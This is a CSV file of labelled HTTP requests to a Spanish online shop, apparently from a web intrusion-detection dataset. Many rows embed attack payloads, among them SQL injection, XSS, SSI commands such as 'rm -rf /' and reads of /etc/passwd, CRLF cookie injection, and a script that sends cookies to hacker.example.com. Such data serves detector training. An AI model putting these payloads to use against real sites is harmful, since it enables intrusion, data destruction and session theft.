request,classification
/tienda1/miembros/editar.jsp /modo=registro&login=butcher&password=PanOso&nombre=Adelqui&apellidos=Riu+Riutort&email=wiren%40acch.mk&dni=92652474X&direccion=Carretera+Industrial%2C+60+&ciudad=Elduain&cp=26250&provincia=%C1vila%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&ntc=7730205532508885&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=butcher&password=PanOso&nombre=Adelqui&apellidos=Riu+Riutort&email=tchoukov%40a_edols%40%40%40manuelpaloma.cy&dni=92652474X&direccion=Carretera+Industrial%2C+60+&ciudad=Elduain&cp=26250&provincia=%C1vila&ntc=7730205532508885&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=butcher&password=PanOso&nombre=Adelqui&apellidos=Riu+Riutort&email=wiren%40acch.mk&dni=92652474X&direccion=Carretera+Industrial%2C+60+&ciudad=Elduain&cp=26250&provincia=%C1vila&ntc=7730205532508885&B1A=Registrar,1
/tienda1/publico/anadir.jsp /id=2&nombre=Queso+Manchego&precio=85&cantidad=5&B1=A%F1adir+al+carrito%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,1
/tienda1/publico/anadir.jsp /id=1%2F&nombre=Queso+Manchego&precio=85&cantidad=5&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=2&nombreA=Queso+Manchego&precio=85&cantidad=5&B1=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=ovas%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&pwd=ric8Me6te&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&login=ovas&pwd=ric8Me6te&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=%27%2Cb%27rieda&pwd=ric8Me6te&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&loginA=ovas&pwd=ric8Me6te&remember=on&B1=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=2%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/caracteristicas.jsp /id=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/caracteristicas.jsp /idA=2,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=3748&B1=Pasar+por+caja%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=%2B&B1=Pasar+por+caja,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=3748&B1=Confirmar%2F,1
/tienda1/publico/pagar.jsp /modoA=insertar&precio=3748&B1=Pasar+por+caja,1
/tienda1/publico/registro.jsp /modo=registro&login=puran&password=3inst9um6n90&nombre=Magno&apellidos=Viladric+Ylla&email=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&dni=94584030A&direccion=Camino+De+Los+Girasoles%2C+138%2C+&ciudad=Navalmoralejo&cp=33402&provincia=Valladolid&ntc=0497803350257870&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=puran&password=3inst9um6n90&nombre=Magno&apellidos=Viladric+Ylla&email=remeck2%40bru%F1oseguridad.aero&dni=94584030A&direccion=Camino+De+Los+Girasoles%2C+138%2C+&ciudad=Par%3Fadas&cp=33402&provincia=Valladolid&ntc=0497803350257870&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=puran&passwordA=3inst9um6n90&nombre=Magno&apellidos=Viladric+Ylla&email=remeck2%40bru%F1oseguridad.aero&dni=94584030A&direccion=Camino+De+Los+Girasoles%2C+138%2C+&ciudad=Navalmoralejo&cp=33402&provincia=Valladolid&ntc=0497803350257870&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carrito%252B,1
/tienda1/publico/vaciar.jsp /B2=%22+AND+%221%22%3D%221,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=ploeg&password=ganchoso&nombre=Arsacio&apellidos=To-nsma%3Fnn&email=merello%40psykoterapi.co&dni=47523526Y&direccion=C%2F+Miguel+Indurain%2C+23%2C+&ciudad=Granyena+de+les+Garrigues&cp=19392&provincia=Zamora&ntc=5291395031650627&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=ploeg&password=ganchoso&nombre=Arsacio&apellidos=Veloso+Moncunil&email=merello%40psykoterapi.co&dniA=47523526Y&direccion=C%2F+Miguel+Indurain%2C+23%2C+&ciudad=Granyena+de+les+Garrigues&cp=19392&provincia=Zamora&ntc=5291395031650627&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=1&nombre=Vino+.*%3FRioja&precio=85&cantidad=42&B1=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=alyssa&pwd=ventr%F3n&remember=on&B1=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=nean%2Bd%27er&pwd=ventr%F3n&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=alyssa&pwd=ventr%F3n&rememberA=on&B1=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=2any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,1
/tienda1/publico/caracteristicas.jsp /idA=2,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=5022&B1=Confirmar%2F,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=5022&B1A=Confirmar,1
/tienda1/publico/registro.jsp /modo=registro&login=babbage&password=Lej%EDSimoS%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Higinia&apellidos=Arribas+Larrakoetxea&email=nichetti%40multireform.bf&dni=86111515K&direccion=Calle+Jesus+Martin+38%2C+&ciudad=Salillas&cp=48150&provincia=Barcelona&ntc=4618456072080141&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=babbage&password=Lej%EDSimoS&nombre=Higinia&apellidos=Arribas+Larrakoetxea&email=nichetti%40multireform.bf&dni=86111515K&direccion=Cal%2Ble+La+Felipa+S%2B%2FN%2C*+12-B&ciudad=Salillas&cp=48150&provincia=Barcelona&ntc=4618456072080141&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=babbage&password=Lej%EDSimoS&nombre=Higinia&apellidos=Arribas+Larrakoetxea&email=nichetti%40multireform.bf&dni=86111515K&direccion=Calle+Jesus+Martin+38%2C+&ciudadA=Salillas&cp=48150&provincia=Barcelona&ntc=4618456072080141&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=delorme&password=terr%EDgena&nombre=Vladimir&apellidos=Basora+Bargall%F3&email=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&dni=40888726Q&direccion=Rio+Deva%2C+127%2C+13H&ciudad=Avinyonet+de+Puigvent%F3s&cp=25151&provincia=Salamanca&ntc=4881663630598066&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=delorme&password=terr%EDgena&nombre=Vladimir&apellidos=Basora+Bargall%F3&email=haynie%40sha%40mb%40alla-es.tel&dni=40888726Q&direccion=Rio+Deva%2C+127%2C+13H&ciudad=Avinyonet+de+Puigvent%F3s&cp=25151&provincia=Salamanca&ntc=4881663630598066&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=2%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&nombre=Queso+Manchego&precio=85&cantidad=9&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=2&nombre=Ques%2Bo+Manchego&precio=85&cantidad=9&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=2&nombre=Queso+Manchego&precio=85&cantidad=9&B1A=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&login=crowder&pwd=6.en0e6at2da&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=*bu%2Fntroc%2Fk4&pwd=6.en0e6at2da&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&loginA=crowder&pwd=6.en0e6at2da&remember=on&B1=Entrar,1
/tienda1/publico/caracteristicas.jsp /idA=1,1
/tienda1/publico/entrar.jsp /errorMsg=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar%2520&precio=7651&B1=Confirmar,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=%3F&B1=Confirmar,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=7651&B1=Confirmar%2F,1
/tienda1/publico/pagar.jsp /modo=insertar&precioA=7651&B1=Confirmar,1
/tienda1/publico/registro.jsp /modo=registro&login=kumamotoparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&password=GLo0Al&nombre=Nelo&apellidos=Marceni%F1o&email=touliatos%40intercambiodeenlaces.hr&dni=19782082N&direccion=C%2F+Andres+Bello%2C+92%2C+6C&ciudad=Alamedilla&cp=13670&provincia=Guadalajara&ntc=2637234925036276&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&password=GLo0Al&nombre=Nelo&apellidos=Marceni%F1o&email=touliatos%40intercambiodeenlaces.hr&dni=19782082N&direccion=C%2F+Andres+Bello%2C+92%2C+6C&ciudad=Alamedilla&cp=13670&provincia=Guadalajara&ntc=2637234925036276&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=kumamoto&password=%274%2C%2CANGAne-3A&nombre=Nelo&apellidos=Marceni%F1o&email=touliatos%40intercambiodeenlaces.hr&dni=19782082N&direccion=C%2F+Andres+Bello%2C+92%2C+6C&ciudad=Alamedilla&cp=13670&provincia=Guadalajara&ntc=2637234925036276&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=kumamoto&password=GLo0Al&nombreA=Nelo&apellidos=Marceni%F1o&email=touliatos%40intercambiodeenlaces.hr&dni=19782082N&direccion=C%2F+Andres+Bello%2C+92%2C+6C&ciudad=Alamedilla&cp=13670&provincia=Guadalajara&ntc=2637234925036276&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carrito%27OR%27a%3D%27a,1
/tienda1/publico/vaciar.jsp /B2=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=tonie&password=fu43on2r&nombre=Ravi&apellidos=Mascarell+Yomona&email=payson_hoven%40quecole.za&dni=05111871Y&direccion=C%2F+Conde+Oliveto+S%2FN%2C+&ciudad=Taradell&cp=19247&provincia=%C1vila&ntc=7846969771020065%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=tonie&password=fu43on2r&nombre=Ravi&apellidos=Mascarell+Yomona&email=payson_hoven%40quecole.za&dni=628B4B11B07R&direccion=C%2F+Conde+Oliveto+S%2FN%2C+&ciudad=Taradell&cp=19247&provincia=%C1vila&ntc=7846969771020065&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=tonie&password=fu43on2r&nombre=Ravi&apellidos=Mascarell+Yomona&email=payson_hoven%40quecole.za&dni=05111871Y&direccion=C%2F+Conde+Oliveto+S%2FN%2C+&ciudad=Taradell&cp=19247&provincia=%C1vila&ntc=7846969771020065&B1A=Registrar,1
/tienda1/publico/anadir.jsp /id=2&nombre=Queso+Manchego&precio=100&cantidad=44&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=2&nombre=Queso+Manchego&precio=100&cantidad=44&B1=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,1
/tienda1/publico/anadir.jsp /id=3%2F&nombre=Queso+Manchego&precio=100&cantidad=44&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=2&nombre=Queso+Manchego&precio=100&cantidad=44&B1A=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=tine&pwd=v%E1L70am4390&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=tine&pwd=v%E1L70am4390any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=renem%2Fa&pwd=v%E1L70am4390&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modoA=entrar&login=tine&pwd=v%E1L70am4390&remember=on&B1=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=1sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,1
/tienda1/publico/caracteristicas.jsp /idA=1,1
/tienda1/publico/entrar.jsp /errorMsg=Credenciales+incorrectassessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=%4040&B1=Pasar+por+caja,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=1737&B1=Confirmar%2F,1
/tienda1/publico/pagar.jsp /modoA=insertar&precio=1737&B1=Pasar+por+caja,1
/tienda1/publico/registro.jsp /modo=registro&login=storelli&password=enforrar&nombre=Adelfo&apellidos=Pozo+Carbot&email=schiaftino%40showenvivo.com.sy%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&dni=56891172M&direccion=Calle+Virgen+De+La+Estrella%2C+150%2C+&ciudad=Fresno+de+Rodilla&cp=49624&provincia=Valencia&ntc=3044392117548178&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=storelli&password=enforrar&nombre=Adelfo&apellidos=Pozo+Carbot&email=schiaftino%40showenvivo.com.sy&dni=56891172M&direccion=Calle+Virgen+De+La+Estrella%2C+150%2C+&ciudad=Fresno+de+Rodilla&cp=49624&provincia=%2520&ntc=3044392117548178&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=storelli&password=enforrar&nombre=Adelfo&apellidos=Pozo+Carbot&email=schiaftino%40showenvivo.com.sy&dni=56891172M&direccion=Calle+Virgen+De+La+Estrella%2C+150%2C+&ciudad=Fresno+de+Rodilla&cp=4216A&provincia=Valencia&ntc=3044392117548178&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carrito%253F,1
/tienda1/publico/vaciar.jsp /B2=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=hamilton&password=178gaTorIO&nombre=%27+DELETE+FROM+USERS&apellidos=Maquieira+San+Segundo&email=glaessner-alwood%40softwaremasservicio.ic&dni=29189199Z&direccion=Redonda%2C+142%2C+13-G&ciudad=R%E1bade&cp=08673&provincia=Le%F3n&ntc=7739977532136253&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=e*berle&password=178gaTorIO&nombre=Guida&apellidos=Maquieira+San+Segundo&email=glaessner-alwood%40softwaremasservicio.ic&dni=29189199Z&direccion=Redonda%2C+142%2C+13-G&ciudad=R%E1bade&cp=08673&provincia=Le%F3n&ntc=7739977532136253&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=3&nombre=Queso+Manchego&precio=85&cantidad=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=3&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=85&cantidad=80&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=3&nombre=Queso+Manchego&precio=85&cantidadA=80&B1=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=junibob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&pwd=8EsCR1BIr&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=juni&pwd=+&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=juni&pwd=%2Cj58A&remember=on&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&loginA=juni&pwd=8EsCR1BIr&remember=on&B1=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=%27+DELETE+FROM+USERS,1
/tienda1/publico/caracteristicas.jsp /idA=2,1
/tienda1/publico/entrar.jsp /errorMsg=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=9248&B1=Confirmar%257C,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=9248&B1=Pasar+por+caja%2F,1
/tienda1/publico/pagar.jsp /modo=insertar&precioA=9248&B1=Confirmar,1
/tienda1/publico/registro.jsp /modo=registro&login=surber&password=sacramentaci%F3n&nombre=Malinda&apellidos=T_orrent&email=byrnes%40nuestrasantacruz.um&dni=20918632V&direccion=C%2F+Del+Ingenio%2C+159+&ciudad=Alpicat&cp=13195&provincia=Teruel&ntc=3176719416679407&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=surber&password=sacramentaci%F3n&nombre=Malinda&apellidos=Romera+Mignolet&emailA=byrnes%40nuestrasantacruz.um&dni=20918632V&direccion=C%2F+Del+Ingenio%2C+159+&ciudad=Alpicat&cp=13195&provincia=Teruel&ntc=3176719416679407&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carrito%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/vaciar.jsp /B2=%4040,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=matsuzak&password=de82g%F3gic8&nombre=Hayd%E9e&apellidos=Arrotcharen+Doniz&email=kontou%4015horas.wf&dni=06384093Y&direccion=Calle+Crucero-bouzas%2C+185%2C+&ciudad=Leaburu&cp=32730&provincia=Teruel&ntc=0473794196460600&B1=Registrarany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A,1
/tienda1/miembros/editar.jsp /modo=registro&login=matsuzak&password=de82g%F3gic8&nombre=Hayd%E9e&apellidos=Arrotcharen+Doniz&email=kontou%4015horas.wf&dni=06384093Y&direccion=Calle+Crucero-bouzas%2C+185%2C+&ciudad=Leaburu&cp=32730&provincia=Teruel&ntc=0473794196460600&B1=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,1
/tienda1/miembros/editar.jsp /modoA=registro&login=matsuzak&password=de82g%F3gic8&nombre=Hayd%E9e&apellidos=Arrotcharen+Doniz&email=kontou%4015horas.wf&dni=06384093Y&direccion=Calle+Crucero-bouzas%2C+185%2C+&ciudad=Leaburu&cp=32730&provincia=Teruel&ntc=0473794196460600&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=68&B1=A%F1adir+al+carrito%253F,1
/tienda1/publico/anadir.jsp /id=%2520&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=68&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=3&nombre=Jam%F3n+Ib%E9rico&precio=100%2F&cantidad=68&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /idA=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=68&B1=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=turnbull&pwd=babera&remember=on%2F&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&loginA=turnbull&pwd=babera&remember=on&B1=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=2%27+DELETE+FROM+USERS,1
/tienda1/publico/caracteristicas.jsp /idA=2,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=2584%2500&B1=Pasar+por+caja,1
/tienda1/publico/pagar.jsp /modo=insertar&precioA=2584&B1=Pasar+por+caja,1
/tienda1/publico/registro.jsp /modo=registro&login=swick&password=recalzar&nombre=Amiel&apellidos=Del+Blanco&email=ying-carridine%40audiosat.sy&dni=55739537A&direccion=Jose+Cadierno+186%2C+6F&ciudad=Nu%E9valos&cp=37621&provincia=Asturias%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&ntc=2320151892972616&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=swick&password=recalzar&nombre=Amiel&apellidos=Del+Blanco&email=ying-carridine%40audiosat.sy&dni=55739537A&direccion=Jose+Cadierno+186%2C+6F&ciudad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&cp=37621&provincia=Asturias&ntc=2320151892972616&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=isk%2Fandar&password=recalzar&nombre=Amiel&apellidos=Del+Blanco&email=ying-carridine%40audiosat.sy&dni=55739537A&direccion=Jose+Cadierno+186%2C+6F&ciudad=Nu%E9valos&cp=37621&provincia=Asturias&ntc=2320151892972616&B1=Registrar,1
/tienda1/publico/registro.jsp /modo=registro&login=swick&password=recalzar&nombre=Amiel&apellidos=Del+Blanco&email=ying-carridine%40audiosat.sy&dni=55739537A&direccion=Jose+Cadierno+186%2C+6F&ciudad=Nu%E9valos&cp=37621&provinciaA=Asturias&ntc=2320151892972616&B1=Registrar,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carrito,1
/tienda1/publico/vaciar.jsp /B2=Vaciar+carrito%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
/tienda1/publico/vaciar.jsp /B2=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C,1
/tienda1/publico/vaciar.jsp /B2A=Vaciar+carrito,1
/tienda1/miembros/editar.jsp /modo=registro&login=grueng&password=ma*guillo&nombre=Nelio&apellidos=Febo+Derch&email=hollen_farber%40bacoespecialselecci%F3n.bu&dni=71766334D&direccion=Calle+Ruise%F1or+34+&ciudad=Moreda+de+%C1lava%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cp=10374&provincia=Segovia&ntc=2753265172656734&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=grueng&password=ma*guillo&nombre=Amar-ilis&apellidos=Febo+Derch&email=hollen_farber%40bacoespecialselecci%F3n.bu&dni=71766334D&direccion=Calle+Ruise%F1or+34+&ciudad=Moreda+de+%C1lava&cp=10374&provincia=Segovia&ntc=2753265172656734&B1=Registrar,1
/tienda1/miembros/editar.jsp /modo=registro&login=grueng&password=ma*guillo&nombre=Nelio&apellidos=Febo+Derch&email=hollen_farber%40bacoespecialselecci%F3n.bu&dniA=71766334D&direccion=Calle+Ruise%F1or+34+&ciudad=Moreda+de+%C1lava&cp=10374&provincia=Segovia&ntc=2753265172656734&B1=Registrar,1
/tienda1/publico/anadir.jsp /id=2&nombre=Vino+.*%3FRioja&precio=39&cantidad=25&B1=A%F1adir+al+carrito,1
/tienda1/publico/anadir.jsp /id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=25&B1A=A%F1adir+al+carrito,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=ivanyi0&pwd=nA%2BrBOn%C9s%22+AND+%221%22%3D%221&remember=off&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&login=ivanyi0&pwd=a%2C9e400%2Cdame16e&remember=off&B1=Entrar,1
/tienda1/publico/autenticar.jsp /modo=entrar&loginA=ivanyi0&pwd=nA%2BrBOn%C9s&remember=off&B1=Entrar,1
/tienda1/publico/caracteristicas.jsp /id=%257C,1
/tienda1/publico/caracteristicas.jsp /idA=1,1
/tienda1/publico/entrar.jsp /errorMsgA=Credenciales+incorrectas,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=3817&B1=%2520,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=3817&B1=Pasar+por+caja%2F,1
/tienda1/publico/pagar.jsp /modo=insertar&precio=3817&B1A=Confirmar,1
/tienda1/publico/registro.jsp /modo=registro&login=satkamp&password=6asc5oSo&nombre=N%E9lida&apellidos=Bote+Montijo&email=hurst%40guejos.iq&dni=91086664V&direccion=Callejon+Cinco+Minutos%2C+31+6%3FD&ciudad=Sieteiglesias+de+Tormes&cp=40355&provincia=Vizcaya&ntc=5805357208824154&B1=Registrar,1
